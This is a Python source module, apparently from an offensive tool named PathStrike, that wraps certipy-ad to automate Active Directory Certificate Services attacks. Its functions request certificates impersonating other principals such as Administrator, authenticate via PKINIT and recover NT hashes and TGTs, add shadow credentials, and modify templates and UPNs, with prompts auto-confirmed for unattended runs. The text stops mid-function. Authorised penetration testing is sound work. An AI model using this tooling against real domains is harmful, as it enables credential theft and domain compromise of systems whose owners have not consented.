"""Async subprocess wrapper for the certipy-ad CLI tool.

certipy-ad is used for Active Directory Certificate Services (AD CS)
exploitation: template enumeration, certificate requests, PKINIT auth,
shadow credentials, template modification, and account UPN manipulation.

Subcommands: find, req, auth, ca, template, forge, shadow, account

Every public function returns a standardised result dict::

    {
        "success": bool,
        "output": str,          # raw stdout
        "parsed": dict | None,  # extracted structured data when available
        "error": str | None,    # stderr or exception message
    }
"""

from __future__ import annotations

import asyncio
import json
import logging
import re
import shlex
from pathlib import Path
from typing import Any

logger = logging.getLogger("pathstrike.tools.certipy")

_SENSITIVE_FLAGS = {"-p", "-password", "--password", "-hashes", "-aes", "-pfx-password"}


def _redact_cmd(cmd: list[str]) -> str:
    """Redact sensitive arguments from a command list for logging."""
    redacted = []
    skip_next = False
    for i, arg in enumerate(cmd):
        if skip_next:
            redacted.append("***REDACTED***")
            skip_next = False
        elif arg in _SENSITIVE_FLAGS and i + 1 < len(cmd):
            redacted.append(arg)
            skip_next = True
        else:
            redacted.append(arg)
    return " ".join(shlex.quote(c) for c in redacted)


# ---------------------------------------------------------------------------
# Failure-mode detection
# ---------------------------------------------------------------------------
#
# Two recurring problems with certipy-ad v5 motivate the helpers below:
#
# 1. Lab DCs and older Windows installs frequently have a non-functional
#    LDAPS listener (port 636 open but TLS handshake resets).  Certipy v5
#    defaults to LDAPS and bails out with ``socket ssl wrapping error``.
#    We detect that pattern in the captured output and auto-retry the
#    command with ``-ldap-scheme ldap`` injected.
#
# 2. Certipy v5 sometimes exits with returncode 0 even when the underlying
#    Kerberos / TLS / RPC operation failed (clock skew, PKINIT not
#    supported, LDAPS reset).  Trusting the rc blindly leads handlers to
#    interpret real failures as "tool succeeded but parser couldn't find
#    anything", which is misleading and prevents the alternate-strategy
#    fall-through in handlers like ACLHandler.  We re-read the captured
#    output for known failure markers and reclassify those runs as
#    ``success=False`` with a useful ``error`` field so handlers can
#    route to their next strategy (e.g. bloodyAD shadow credentials).

# Patterns indicating LDAPS-specific failure that plain LDAP could fix.
_LDAPS_ERROR_PATTERNS: tuple[re.Pattern[str], ...] = (
    re.compile(r"socket ssl wrapping error", re.IGNORECASE),
    re.compile(r"\[SSL:[^\]]*\]\s*(?:tlsv1|wrong version|unknown protocol)",
               re.IGNORECASE),
    re.compile(r"SSL handshake.*?fail", re.IGNORECASE | re.DOTALL),
)


def _is_ldaps_handshake_error(result: dict[str, Any]) -> bool:
    """True if the captured output points at LDAPS-side TLS failure."""
    text = (result.get("output") or "") + "\n" + (result.get("stderr") or "")
    return any(p.search(text) for p in _LDAPS_ERROR_PATTERNS)


def _ldaps_error_summary(result: dict[str, Any]) -> str | None:
    """Pull a concise one-line summary of the LDAPS failure for log lines."""
    text = (result.get("output") or "") + "\n" + (result.get("stderr") or "")
    for pattern in _LDAPS_ERROR_PATTERNS:
        m = pattern.search(text)
        if m:
            line_start = text.rfind("\n", 0, m.start()) + 1
            line_end = text.find("\n", m.end())
            if line_end == -1:
                line_end = len(text)
            return text[line_start:line_end].strip().lstrip("[-] ").strip()[:200]
    return None


def _args_specify_ldap_scheme(args: list[str]) -> bool:
    """True if the caller already pinned ``-ldap-scheme`` (any value)."""
    return any(
        a == "-ldap-scheme" or a.startswith("-ldap-scheme=")
        for a in args
    )


# Patterns indicating certipy returned rc=0 despite a real failure.
# Order matters — the first match wins, so put specific patterns first.
# A summary of None means "use the regex's first capture group as the
# summary" (used for the generic TGT-failure catch-all).
_SILENT_FAILURE_PATTERNS: tuple[tuple[re.Pattern[str], str | None], ...] = (
    (re.compile(r"KRB_AP_ERR_SKEW", re.IGNORECASE),
     "KDC clock skew too great — sync the local clock to the DC"),
    (re.compile(r"Clock skew too great", re.IGNORECASE),
     "KDC clock skew too great — sync the local clock to the DC"),
    (re.compile(r"KDC_ERR_PADATA_TYPE_NOSUPP", re.IGNORECASE),
     "KDC has no support for PKINIT (no KDC certificate installed on the DC)"),
    (re.compile(r"KDC_ERR_CLIENT_NOT_TRUSTED", re.IGNORECASE),
     "KDC does not trust the certificate (cert chain or NTAuthCertificates issue)"),
    (re.compile(r"KDC_ERR_C_PRINCIPAL_UNKNOWN", re.IGNORECASE),
     "KDC reports the client principal is unknown"),
    (re.compile(r"socket ssl wrapping error", re.IGNORECASE),
     "LDAPS SSL handshake failed against the DC"),
    (re.compile(r"Connection reset by peer", re.IGNORECASE),
     "Connection reset by remote peer"),
    (re.compile(r"\[-\]\s*Got error while trying to request TGT[: ]+(.+)",
                re.IGNORECASE),
     None),
    (re.compile(r"\[-\]\s*Got error[: ]+(.+)", re.IGNORECASE),
     None),
)


def _detect_silent_failure(stdout: str, stderr: str) -> str | None:
    """Detect cases where certipy exited 0 even though it actually failed.

    Returns a one-line failure summary suitable for the result ``error``
    field, or ``None`` when no failure indicators are present.
    """
    text = "\n".join(s for s in (stdout, stderr) if s)
    if not text:
        return None

    for pattern, summary in _SILENT_FAILURE_PATTERNS:
        m = pattern.search(text)
        if m is None:
            continue
        if summary is not None:
            return summary
        # Use the first capture group as the summary (generic fallback).
        try:
            return m.group(1).strip().rstrip(".").strip()[:200]
        except IndexError:
            return m.group(0).strip()[:200]
    return None


# ---------------------------------------------------------------------------
# Core runner
# ---------------------------------------------------------------------------


async def run_certipy(
    subcommand: str,
    args: list[str],
    timeout: int = 60,
    input_data: bytes | None = None,
) -> dict[str, Any]:
    """Run a certipy-ad command and return parsed output.

    Subcommands supported: ``find``, ``req``, ``auth``, ``ca``, ``template``,
    ``forge``, ``shadow``, ``account``.

    Two transparent reliability tweaks are applied around the raw
    subprocess call:

      * **LDAPS auto-retry** — if the first attempt fails with an LDAPS
        TLS handshake error (common against lab DCs whose 636/tcp port
        accepts connections but resets the handshake), the command is
        retried with ``-ldap-scheme ldap`` injected.  The first
        attempt's error summary is preserved on the result as
        ``ldaps_first_error`` and ``ldaps_retry=True``.

      * **Silent-failure reclassification** — certipy v5 sometimes exits
        0 even when the operation it wrapped (Kerberos pre-auth, LDAPS
        bind, RPC call) actually failed.  When known failure markers
        appear in the output (clock skew, PKINIT-unsupported, SSL
        reset, generic ``[-] Got error``), the wrapper marks
        ``success=False`` so handlers fall through to alternate
        strategies (e.g. bloodyAD shadow credentials in ACLHandler).

    Args:
        subcommand: The certipy subcommand to invoke.
        args: Additional CLI arguments for the subcommand.
        timeout: Maximum seconds to wait for the subprocess.
        input_data: Optional bytes to write to certipy's stdin.  Used to
            auto-confirm interactive prompts (e.g. ``certipy template``
            asks "Are you sure you want to apply these changes?").
            Pass ``b"y\\n"`` to confirm.  Subprocess capture mode keeps
            stdin attached as a pipe so unattended pentest automation
            never hangs on a prompt.

    Returns:
        Standardised result dict with ``success``, ``output``, ``parsed``,
        and ``error`` keys.
    """
    result = await _run_certipy_once(
        subcommand, args, timeout=timeout, input_data=input_data,
    )

    # LDAPS → plain-LDAP auto-retry, but only when the caller hasn't
    # already pinned a scheme.
    if _is_ldaps_handshake_error(result) and not _args_specify_ldap_scheme(args):
        first_error = _ldaps_error_summary(result) or "LDAPS handshake failed"
        logger.warning(
            "certipy %s LDAPS attempt failed (%s); retrying with -ldap-scheme ldap",
            subcommand, first_error,
        )
        retry_args = ["-ldap-scheme", "ldap"] + list(args)
        retry_result = await _run_certipy_once(
            subcommand, retry_args, timeout=timeout, input_data=input_data,
        )
        retry_result["ldaps_retry"] = True
        retry_result["ldaps_first_error"] = first_error
        if retry_result.get("success"):
            logger.info(
                "certipy %s succeeded after falling back to plain LDAP",
                subcommand,
            )
        result = retry_result

    return result


async def _run_certipy_once(
    subcommand: str,
    args: list[str],
    timeout: int = 60,
    input_data: bytes | None = None,
) -> dict[str, Any]:
    """Execute a single certipy invocation. Caller orchestrates retries.

    See :func:`run_certipy` for the public entrypoint that adds LDAPS
    auto-retry and silent-failure reclassification on top of this.
    """
    from pathstrike.engine.time_sync import get_faketime_prefix

    cmd = get_faketime_prefix() + ["certipy", subcommand] + args
    logger.debug("Executing: %s", _redact_cmd(cmd))

    result: dict[str, Any] = {
        "success": False,
        "output": "",
        "parsed": None,
        "error": None,
        "tool": "certipy",
        "command": " ".join(shlex.quote(c) for c in cmd),
    }

    try:
        # When auto-confirming a prompt (input_data set), open stdin
        # as a pipe so communicate() can write to it.  Otherwise leave
        # stdin attached to the parent's null device so certipy gets
        # an immediate EOF on any unexpected read.
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdin=asyncio.subprocess.PIPE if input_data is not None else asyncio.subprocess.DEVNULL,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout_bytes, stderr_bytes = await asyncio.wait_for(
            proc.communicate(input=input_data), timeout=timeout
        )

        stdout = stdout_bytes.decode("utf-8", errors="replace").strip()
        stderr = stderr_bytes.decode("utf-8", errors="replace").strip()

        result["output"] = stdout
        result["stderr"] = stderr
        result["return_code"] = proc.returncode

        if proc.returncode != 0:
            # Short 1-line summary goes to `error` (surfaces in handler
            # messages + the Rich step table).  Full stderr stays in the
            # session log file only, to avoid flooding the console
            # mid-Live-render.
            short_err = _extract_certipy_error(stderr) or (
                f"certipy {subcommand} exited with code {proc.returncode}"
            )
            result["error"] = short_err
            result["full_stderr"] = stderr
            logger.debug(
                "certipy %s failed (rc=%d): %s\n--- full stderr ---\n%s",
                subcommand, proc.returncode, short_err, stderr,
            )
            return result

        # rc=0, but inspect the captured output for silent-failure markers
        # before claiming success.  certipy v5 exits 0 on several real
        # failure modes (clock skew, PKINIT unsupported, LDAPS reset)
        # and we want handlers to see those as failures so they fall
        # through to alternate strategies.
        silent_err = _detect_silent_failure(stdout, stderr)
        if silent_err:
            result["error"] = silent_err
            result["error_type"] = "silent_failure"
            result["full_stderr"] = stderr
            # Annotate whether certipy printed its own "Successfully
            # restored" marker — handlers can use this to decide whether
            # AD state is clean enough to retry with a different tool.
            combined = f"{stdout}\n{stderr}"
            result["ad_state_restored"] = "Successfully restored" in combined
            logger.warning(
                "certipy %s exited 0 but output indicates failure: %s",
                subcommand, silent_err,
            )
            logger.debug(
                "certipy %s silent-failure full output:\n--- stdout ---\n%s\n"
                "--- stderr ---\n%s",
                subcommand, stdout, stderr,
            )
            return result

        # Genuine success.  certipy-ad writes status lines to stderr by
        # default (Python logging convention); combine both streams so
        # the parsers see everything.
        parse_source = "\n".join(filter(None, [stdout, stderr]))
        result["parsed"] = _parse_certipy_output(subcommand, parse_source)
        result["success"] = True
        logger.debug("certipy %s succeeded: %s", subcommand, stdout[:200])

    except asyncio.TimeoutError:
        result["error"] = f"certipy {subcommand} timed out after {timeout}s"
        result["error_type"] = "timeout"
        logger.warning(result["error"])
    except FileNotFoundError:
        result["error"] = (
            "certipy binary not found. Install via: pip install certipy-ad"
        )
        result["error_type"] = "tool_not_found"
        logger.error(result["error"])  # real config error — keep at ERROR
    except OSError as exc:
        result["error"] = f"OS error launching certipy: {exc}"
        result["error_type"] = "os_error"
        logger.warning(result["error"])

    return result


def _extract_certipy_error(stderr: str) -> str | None:
    """Pull a useful one-line error message from certipy stderr.

    Certipy prints structured ``[!] ...`` / ``[-] ...`` lines when things
    fail.  Pick the most informative one (last non-empty line that starts
    with ``[-]`` or contains ``Error``); fall back to the last line.
    """
    if not stderr:
        return None
    lines = [ln.rstrip() for ln in stderr.splitlines() if ln.strip()]
    if not lines:
        return None
    for line in reversed(lines):
        if line.startswith("[-]") or "Error" in line or "failed" in line.lower():
            return line.strip("[-] ").strip()[:300]
    return lines[-1][:300]


# ---------------------------------------------------------------------------
# Output parsing helpers
# ---------------------------------------------------------------------------


def _parse_certipy_output(subcommand: str, stdout: str) -> dict[str, Any] | None:
    """Attempt to extract structured data from certipy stdout.

    Different subcommands produce different output formats. This function
    dispatches to specialised parsers where possible.
    """
    parsers: dict[str, Any] = {
        "find": _parse_find_output,
        "req": _parse_req_output,
        "auth": _parse_auth_output,
        "shadow": _parse_shadow_output,
        "template": _parse_template_output,
        "account": _parse_account_output,
    }
    parser = parsers.get(subcommand)
    if parser:
        return parser(stdout)
    return None


def _try_load_json_file(pattern: str, stdout: str) -> dict[str, Any] | None:
    """Try to load a JSON file referenced in certipy output."""
    match = re.search(pattern, stdout)
    if match:
        json_path = Path(match.group(1))
        if json_path.exists():
            try:
                return json.loads(json_path.read_text(encoding="utf-8"))
            except (json.JSONDecodeError, OSError):
                pass
    return None


def _parse_find_output(stdout: str) -> dict[str, Any] | None:
    """Parse ``certipy find`` output into structured findings.

    Certipy writes an output summary to stdout and a JSON file to disk.
    When the JSON file is present we load it for precise findings;
    otherwise we fall back to scraping stdout.

    Returns a dict with:
      * ``json_path`` / ``txt_path`` / ``bloodhound_zip`` (file paths if
        certipy saved them)
      * ``vulnerabilities``: deduplicated list of ESC labels seen
        (``["ESC1", "ESC4", ...]``)
      * ``cas``: deduplicated list of Certificate Authority names
        observed in the output (only populated when JSON output is
        available — text-mode parsing rarely sees CAs by name)
      * ``findings``: list of per-template dicts
        ``{"template": str, "esc": str, "edge_type": str,
           "ca_name": str, "principal": str}`` — one entry per
        (template × ESC × principal) tuple.  ``edge_type`` is the
        BloodHound-compatible label (e.g. ``"ADCSESC1"``).  ``ca_name``
        is the Enabled-on CA when known and an empty string otherwise.
    """
    parsed: dict[str, Any] = {}

    # Output file paths
    json_match = re.search(r"Saved JSON output to '(.+?\.json)'", stdout)
    if json_match:
        parsed["json_path"] = json_match.group(1)

    zip_match = re.search(r"Saved BloodHound data to '(.+?\.zip)'", stdout)
    if zip_match:
        parsed["bloodhound_zip"] = zip_match.group(1)

    txt_match = re.search(r"Saved text output to '(.+?\.txt)'", stdout)
    if txt_match:
        parsed["txt_path"] = txt_match.group(1)

    # Deduplicated vulnerability labels mentioned anywhere in stdout.
    vuln_labels = re.findall(r"ESC\d+[a-z]?", stdout)
    if vuln_labels:
        parsed["vulnerabilities"] = sorted(set(vuln_labels))

    # Structured findings: prefer the JSON file if available.
    findings: list[dict[str, str]] = []
    cas: list[str] = []
    if "json_path" in parsed:
        findings, cas = _extract_findings_and_cas_from_json(parsed["json_path"])
    if not findings:
        findings = _extract_findings_from_text(stdout)
    if findings:
        parsed["findings"] = findings
    if cas:
        parsed["cas"] = cas

    return parsed if parsed else None


# ESC → BloodHound edge type mapping.  Handlers registered in
# pathstrike.handlers.adcs key off these names, so keep in sync.
_ESC_TO_BH_EDGE: dict[str, str] = {
    "ESC1": "ADCSESC1",
    "ESC2": "ADCSESC2",
    "ESC3": "ADCSESC3",
    "ESC4": "ADCSESC4",
    "ESC5": "ADCSESC5",
    "ESC6": "ADCSESC6a",   # BH splits 6 into 6a/6b; default to 6a
    "ESC6a": "ADCSESC6a",
    "ESC6b": "ADCSESC6b",
    "ESC7": "ADCSESC7",
    "ESC8": "ADCSESC8",
    "ESC9": "ADCSESC9a",
    "ESC9a": "ADCSESC9a",
    "ESC9b": "ADCSESC9b",
    "ESC10": "ADCSESC10a",
    "ESC10a": "ADCSESC10a",
    "ESC10b": "ADCSESC10b",
    "ESC11": "ADCSESC11",
    "ESC13": "ADCSESC13",
}


def _extract_template_ca_names(tpl: dict[str, Any]) -> list[str]:
    """Pull the CA name(s) a template is enabled on from a JSON template entry.

    Certipy's JSON layout has shifted between releases — different
    versions surface the enabled-on CAs under different keys.  We try
    every known shape and dedup the result so consumers get a stable
    list regardless of certipy version.
    """
    candidates: list[str] = []
    for key in (
        "Certificate Authorities",  # v4 with -json
        "Enabled",                   # some v5 builds use this for CA list
        "CA Name",                   # rare single-string field
        "CAs",
    ):
        val = tpl.get(key)
        if isinstance(val, list):
            for item in val:
                if isinstance(item, str) and item.strip():
                    candidates.append(item.strip())
        elif isinstance(val, str) and val.strip():
            candidates.append(val.strip())

    seen: set[str] = set()
    unique: list[str] = []
    for ca in candidates:
        if ca not in seen:
            seen.add(ca)
            unique.append(ca)
    return unique


def _extract_cas_from_json_root(data: dict[str, Any]) -> list[str]:
    """Pull all CA names from the top-level ``Certificate Authorities`` section."""
    cas_section = data.get("Certificate Authorities") or {}
    if isinstance(cas_section, dict):
        iterator = cas_section.values()
    elif isinstance(cas_section, list):
        iterator = cas_section
    else:
        return []

    seen: set[str] = set()
    names: list[str] = []
    for entry in iterator:
        if not isinstance(entry, dict):
            continue
        name = entry.get("CA Name") or entry.get("Name") or ""
        if name and name not in seen:
            seen.add(name)
            names.append(str(name))
    return names


def _extract_findings_and_cas_from_json(
    json_path: str,
) -> tuple[list[dict[str, str]], list[str]]:
    """Load certipy's JSON output and extract ESC findings + CA name list.

    certipy's JSON schema (v4 / v5) contains:
      * a top-level ``Certificate Authorities`` section listing every CA
        the enumeration discovered.
      * a ``Certificate Templates`` section keyed by template index, each
        template having an optional ``[!] Vulnerabilities`` sub-dict
        keyed by ESC name and per-template ``Certificate Authorities``
        (the CAs the template is enabled on).

    Returns ``(findings, cas)`` — findings carry ``ca_name`` so handlers
    can dispatch directly, and cas is the deduplicated set of all CA
    names observed (useful for the standalone ``pathstrike adcs``
    discovery command).
    """
    from pathlib import Path as _Path

    p = _Path(json_path)
    if not p.exists():
        return [], []
    try:
        data = json.loads(p.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, OSError):
        return [], []

    cas_top = _extract_cas_from_json_root(data)

    findings: list[dict[str, str]] = []
    templates = data.get("Certificate Templates", {}) or {}
    if isinstance(templates, dict):
        iterator = templates.values()
    elif isinstance(templates, list):
        iterator = templates
    else:
        iterator = []

    seen_cas: set[str] = set(cas_top)
    all_cas: list[str] = list(cas_top)

    for tpl in iterator:
        if not isinstance(tpl, dict):
            continue
        name = tpl.get("Template Name") or tpl.get("Display Name") or ""
        tpl_cas = _extract_template_ca_names(tpl)
        # Pick the first CA the template is enabled on as the canonical
        # one for this finding — handlers only need a single CA name to
        # request a cert.  Templates enabled on multiple CAs are rare
        # but harmless: picking any enabled CA still works.
        primary_ca = tpl_cas[0] if tpl_cas else ""
        for ca in tpl_cas:
            if ca not in seen_cas:
                seen_cas.add(ca)
                all_cas.append(ca)

        vulns = tpl.get("[!] Vulnerabilities") or tpl.get("Vulnerabilities") or {}
        if not isinstance(vulns, dict):
            continue
        for esc, description in vulns.items():
            esc_clean = esc.strip().upper()
            edge_type = _ESC_TO_BH_EDGE.get(esc_clean, f"ADCS{esc_clean}")
            desc_str = str(description)
            principals = _extract_principals(desc_str)
            if principals:
                for principal in principals:
                    findings.append({
                        "template": str(name),
                        "esc": esc_clean,
                        "edge_type": edge_type,
                        "ca_name": primary_ca,
                        "principal": principal,
                    })
            else:
                # Record without principal — the handler may still match
                # via its own enumeration, and at minimum we note the ESC.
                findings.append({
                    "template": str(name),
                    "esc": esc_clean,
                    "edge_type": edge_type,
                    "ca_name": primary_ca,
                    "principal": "",
                })
    return findings, all_cas


def _extract_findings_from_text(stdout: str) -> list[dict[str, str]]:
    """Fallback text parser for `certipy find` stdout when no JSON file exists.

    Splits stdout on ``Template Name`` markers to get per-template blocks,
    then looks for ``ESC<N>`` lines within each block and captures any
    quoted principal names from the description.  Best-effort scrapes
    the ``Certificate Authorities`` line within the block to populate
    ``ca_name`` — empty when absent.
    """
    findings: list[dict[str, str]] = []
    # Split on the "Template Name" field — the preamble before the first
    # split is discarded.
    blocks = re.split(r"\n\s*Template Name\s*:\s*", stdout)
    for block in blocks[1:]:
        lines = block.splitlines()
        template = lines[0].strip() if lines else ""

        # Best-effort CA name scrape from this template's block.
        ca_match = re.search(
            r"\n\s*Certificate Authorities\s*:\s*(.+)", block,
        )
        ca_name = ""
        if ca_match:
            # certipy prints either a single CA on the same line or a
            # bullet list on subsequent lines — take the first non-empty
            # token from either shape.
            first = ca_match.group(1).strip().splitlines()[0].strip()
            if first:
                ca_name = first.lstrip("- ").strip()
            else:
                # Look one line down for the first bullet
                tail = block[ca_match.end():].splitlines()
                for ln in tail:
                    s = ln.strip().lstrip("- ").strip()
                    if s and not s.endswith(":"):
                        ca_name = s
                        break

        # Iterate ESC lines within the block.
        #
        # Lookahead variants:
        #   * ``\n\s*(?:ESC\d|\[|Template|$)`` — next section header,
        #     or end-of-block following a trailing newline.
        #   * ``$`` (outer) — end-of-string with NO preceding newline,
        #     which is what we get when the captured stdout has been
        #     ``.strip()``-ed by ``_run_certipy_once``.  Without this
        #     alternative the LAST ESC finding in the LAST template is
        #     silently dropped — see the bug where stripped stdout
        #     ending in ``permissions.`` produced zero findings.
        for m in re.finditer(
            r"ESC(\d+[a-z]?)\s*:\s*(.+?)(?=\n\s*(?:ESC\d|\[|Template|$)|$)",
            block, re.DOTALL,
        ):
            esc = f"ESC{m.group(1).upper()}"
            desc = m.group(2)
            edge_type = _ESC_TO_BH_EDGE.get(esc, f"ADCS{esc}")
            principals = _extract_principals(desc) or [""]
            for principal in principals:
                findings.append({
                    "template": template,
                    "esc": esc,
                    "edge_type": edge_type,
                    "ca_name": ca_name,
                    "principal": principal,
                })
    return findings


def _extract_principals(text: str) -> list[str]:
    """Pull quoted principal names from a certipy vulnerability description."""
    return re.findall(r"'([^']+)'", text)


def _parse_req_output(stdout: str) -> dict[str, Any] | None:
    """Parse ``certipy req`` output to extract the PFX path."""
    parsed: dict[str, Any] = {}

    # Certipy versions vary in which message they print:
    #   v4 / older v5: "Saved certificate and private key to 'X.pfx'"
    #   v5.0.4+:       "Saving certificate and private key to 'X.pfx'"
    #                  "Wrote certificate and private key to 'X.pfx'"
    # Match all three so the parser doesn't silently lose the PFX path
    # on the user's actual installed version — that bug manifested as
    # `Certificate request succeeded but no PFX path in output` even
    # when the cert had been issued correctly.
    pfx_match = re.search(
        r"(?:Saved|Saving|Wrote) certificate and private key to '(.+?\.pfx)'",
        stdout,
    )
    if pfx_match:
        parsed["pfx_path"] = pfx_match.group(1)

    # Check for request ID (useful for pending requests)
    reqid_match = re.search(r"Request ID is (\d+)", stdout)
    if reqid_match:
        parsed["request_id"] = int(reqid_match.group(1))

    # Check for success indicators
    if "Successfully" in stdout or pfx_match:
        parsed["requested"] = True

    return parsed if parsed else None


def _parse_auth_output(stdout: str) -> dict[str, Any] | None:
    """Parse ``certipy auth`` output to extract TGT and NT hash.

    certipy auth performs PKINIT authentication and optionally performs
    UnPAC-the-hash to recover the NT hash.
    """
    parsed: dict[str, Any] = {}

    # NT hash extraction — certipy prints "Got hash for 'user@domain': LM:NT"
    nt_match = re.search(
        r"Got hash for [^:]+:\s*[a-fA-F0-9]{32}:([a-fA-F0-9]{32})", stdout
    )
    if not nt_match:
        nt_match = re.search(
            r"NT hash.*?:\s*(?:[a-fA-F0-9]{32}:)?([a-fA-F0-9]{32})", stdout, re.DOTALL
        )
    if nt_match:
        parsed["nt_hash"] = nt_match.group(1).lower()

    # ccache file path — certipy v5.0.4 says "Saving"/"Wrote", not "Saved"
    ccache_match = re.search(
        r"(?:Saved|Saving|Wrote) credential cache to '(.+?\.ccache)'", stdout,
    )
    if ccache_match:
        parsed["ccache_path"] = ccache_match.group(1)

    # UPN / principal from the certificate
    upn_match = re.search(r"Using principal: (.+)", stdout)
    if upn_match:
        parsed["principal"] = upn_match.group(1).strip()

    # TGT received indicator
    if "Got TGT" in stdout or ccache_match:
        parsed["tgt_obtained"] = True

    return parsed if parsed else None


def _parse_shadow_output(stdout: str) -> dict[str, Any] | None:
    """Parse ``certipy shadow`` output for device ID and cert paths."""
    parsed: dict[str, Any] = {}

    # Device ID — certipy prints either "DeviceID 'uuid'" or "Device ID: uuid"
    device_match = re.search(r"Device\s*ID[:\s'\"]+([a-fA-F0-9-]{36})", stdout, re.IGNORECASE)
    if device_match:
        parsed["device_id"] = device_match.group(1)

    # PFX path from shadow auto/add — see _parse_req_output comment.
    pfx_match = re.search(
        r"(?:Saved|Saving|Wrote) certificate and private key to '(.+?\.pfx)'",
        stdout,
    )
    if pfx_match:
        parsed["pfx_path"] = pfx_match.group(1)

    # NT hash from shadow auto.
    # certipy prints: "Got hash for 'user@domain': LM:NT"
    nt_match = re.search(
        r"Got hash for [^:]+:\s*[a-fA-F0-9]{32}:([a-fA-F0-9]{32})", stdout
    )
    if not nt_match:
        # fallback for older / alternative output formats
        nt_match = re.search(
            r"NT hash.*?:\s*(?:[a-fA-F0-9]{32}:)?([a-fA-F0-9]{32})", stdout, re.DOTALL
        )
    if nt_match:
        parsed["nt_hash"] = nt_match.group(1).lower()

    # ccache from shadow auto — see _parse_req_output comment.
    ccache_match = re.search(
        r"(?:Saved|Saving|Wrote) credential cache to '(.+?\.ccache)'", stdout,
    )
    if ccache_match:
        parsed["ccache_path"] = ccache_match.group(1)

    return parsed if parsed else None


def _parse_template_output(stdout: str) -> dict[str, Any] | None:
    """Parse ``certipy template`` output for saved configuration."""
    parsed: dict[str, Any] = {}

    # Old template config backup path.  certipy v5 wording varies:
    # "Saved old configuration to ..." (older), "Saving configuration to ..."
    # (v5.0.4), "Wrote configuration to ...".  Match all three so the
    # restore step always has a path to roll back from.
    old_match = re.search(
        r"(?:Saved|Saving|Wrote)\s+(?:old\s+)?configuration.*?'(.+?\.json)'",
        stdout,
    )
    if old_match:
        parsed["old_config_path"] = old_match.group(1)

    if "Successfully" in stdout:
        parsed["modified"] = True

    return parsed if parsed else None


def _parse_account_output(stdout: str) -> dict[str, Any] | None:
    """Parse ``certipy account`` output for UPN changes."""
    parsed: dict[str, Any] = {}

    old_upn_match = re.search(r"Old UPN: (.+)", stdout)
    if old_upn_match:
        parsed["old_upn"] = old_upn_match.group(1).strip()

    new_upn_match = re.search(r"New UPN: (.+)", stdout)
    if new_upn_match:
        parsed["new_upn"] = new_upn_match.group(1).strip()

    if "Successfully" in stdout:
        parsed["modified"] = True

    return parsed if parsed else None


# ---------------------------------------------------------------------------
# Convenience functions
# ---------------------------------------------------------------------------


async def certipy_find(
    target: str,
    auth_args: list[str],
    vulnerable: bool = True,
    stdout: bool = False,
    timeout: int = 120,
) -> dict[str, Any]:
    """Find certificate templates and CAs, optionally filtering for vulnerabilities.

    Args:
        target: Domain controller host or IP.
        auth_args: Authentication arguments (``-u``, ``-p``, etc.).
        vulnerable: If ``True``, add the ``-vulnerable`` flag to filter results.
        stdout: If ``True``, add ``-stdout`` to print output directly.
        timeout: Maximum seconds to wait.

    Returns:
        Result dict. On success, ``parsed`` may contain paths to output files
        and a list of detected vulnerability classes.
    """
    args = ["-dc-ip", target] + auth_args
    if vulnerable:
        args.append("-vulnerable")
    if stdout:
        args.append("-stdout")

    return await run_certipy("find", args, timeout=timeout)


async def certipy_request(
    target: str,
    ca: str,
    template: str,
    auth_args: list[str],
    upn: str | None = None,
    on_behalf_of: str | None = None,
    sid: str | None = None,
    target_ip: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Request a certificate from a Certificate Authority.

    Args:
        target: Hostname for ``-target`` — preferably the CA's FQDN.
            certipy uses this for the RPC connection to the CA.  Passing
            the bare DC IP causes certipy to fall back to NETBIOS name
            resolution, which times out on most pentest networks; pass
            the FQDN here and use *target_ip* to override DNS.
        ca: Certificate Authority name (e.g. ``"CORP-CA"``).
        template: Certificate template name.
        auth_args: Authentication arguments.
        upn: Alternate UPN to specify in the SAN (ESC1/ESC6 exploitation).
        on_behalf_of: Request certificate on behalf of another user (ESC3).
        sid: Object SID to embed in the SAN URL extension.  Required by
            modern AD environments that enforce the
            ``szOID_NTDS_CA_SECURITY_EXT`` mitigation (May 2022 patch).
            Pass the target principal's SID (e.g.
            ``"S-1-5-21-...-500"`` for Administrator).  When omitted on
            an environment that requires it, PKINIT will fail with
            ``KDC_ERR_CLIENT_NOT_TRUSTED`` after issuance.
        target_ip: Explicit IP override for *target*.  When set, certipy
            connects to this IP instead of resolving *target* via DNS.
            Use this so PathStrike works on attacker hosts without
            ``/etc/hosts`` entries for the target domain.

    Returns:
        Result dict. On success, ``parsed["pfx_path"]`` contains the PFX output path.
    """
    args = ["-target", target, "-ca", ca, "-template", template] + auth_args

    if target_ip:
        args.extend(["-target-ip", target_ip])
    if upn:
        args.extend(["-upn", upn])
    if on_behalf_of:
        args.extend(["-on-behalf-of", on_behalf_of])
    if sid:
        args.extend(["-sid", sid])

    return await run_certipy("req", args, timeout=timeout)


async def certipy_auth(
    pfx_path: str,
    dc_ip: str,
    domain: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Authenticate with a certificate via PKINIT to obtain a TGT and NT hash.

    This performs the full PKINIT + UnPAC-the-hash flow:
    1. Authenticate to the KDC using the certificate in the PFX file
    2. Obtain a TGT (saved as a ccache file)
    3. Recover the NT hash via U2U (UnPAC-the-hash)

    Args:
        pfx_path: Path to the PFX certificate file.
        dc_ip: Domain controller IP address.
        domain: Optional domain name override.

    Returns:
        Result dict. On success, ``parsed`` contains ``nt_hash``, ``ccache_path``,
        and ``tgt_obtained`` keys.
    """
    args = ["-pfx", pfx_path, "-dc-ip", dc_ip]
    if domain:
        args.extend(["-domain", domain])

    return await run_certipy("auth", args, timeout=timeout)


async def certipy_shadow(
    subaction: str,
    target: str,
    account: str,
    auth_args: list[str],
    device_id: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Perform shadow credentials operations.

    Shadow credential subactions:
    - ``auto``: Add key credential, authenticate, recover NT hash (full chain)
    - ``add``: Add a key credential to the target account
    - ``remove``: Remove a key credential by device ID
    - ``list``: List all key credentials on the target account
    - ``clear``: Remove all key credentials from the target account

    Args:
        subaction: One of ``auto``, ``add``, ``remove``, ``list``, ``clear``.
        target: Domain controller host or IP.
        account: Target account sAMAccountName.
        auth_args: Authentication arguments.
        device_id: Device ID for the ``remove`` subaction.

    Returns:
        Result dict. For ``auto``/``add``, ``parsed`` may contain ``device_id``,
        ``pfx_path``, ``nt_hash``, and ``ccache_path``.
    """
    valid_subactions = ("auto", "add", "remove", "list", "clear")
    if subaction not in valid_subactions:
        return {
            "success": False,
            "output": "",
            "parsed": None,
